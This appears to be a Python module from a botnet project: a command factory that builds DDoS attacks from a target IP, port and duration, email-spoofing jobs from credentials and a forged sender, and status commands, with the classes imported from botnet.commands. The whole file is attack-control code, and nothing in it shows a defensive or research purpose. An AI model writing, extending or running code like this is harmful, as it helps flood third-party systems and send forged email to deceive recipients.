from grpc import Status
from botnet.commands.ddos import Ddos
from botnet.commands.email_spoof import EmailSpoof


def command_factory(command_type, params):
    if command_type is None:
        return
    
    match command_type:
        case "ddos":
            return Ddos(params["target_ip"], params["source_port"], params["max_duration"])
    
        case "email_spoof":
            return EmailSpoof(params["username"], params["password"], params["fake_from"], params["fake_name"], params["to_email"],params["to_name"], params["subject"], params["content"])
        
        case "status":
            return Status(command_type)
        
        case _:
            return
